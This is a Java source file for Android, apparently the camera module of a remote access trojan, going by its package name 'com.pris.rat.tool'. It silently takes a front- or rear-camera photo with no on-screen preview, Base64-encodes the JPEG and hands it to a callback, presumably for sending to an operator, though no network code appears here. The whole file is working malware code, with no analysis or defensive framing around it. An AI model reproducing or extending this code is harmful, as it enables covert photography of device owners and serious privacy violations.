package com.pris.rat.tool;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.util.Base64;

import androidx.annotation.NonNull;

import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraModule {
    private final Context ctx;
    private final CameraCallback callback;

    public interface CameraCallback {
        void onPhoto(String base64);
    }

    public CameraModule(Context ctx, CameraCallback callback) {
        this.ctx = ctx;
        this.callback = callback;
    }

    public void capturePhoto(boolean front) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { callback.onPhoto(""); return; }

            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        cameraId = id; break;
                    } else if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        cameraId = id; break;
                    }
                }
            }
            if (cameraId == null) { callback.onPhoto(""); return; }

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(r -> {
                Image img = r.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    callback.onPhoto(b64);
                    r.close();
                }
            }, null);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ctx.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    callback.onPhoto("");
                    return;
                }
            }

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    try {
                                        session.capture(b.build(), null, null);
                                    } catch (Exception ignored) {}
                                }
                                @Override
                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
                            }, null);
                    } catch (Exception ignored) {}
                }
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override
                public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, null);
        } catch (Exception e) {
            callback.onPhoto("");
        }
    }
}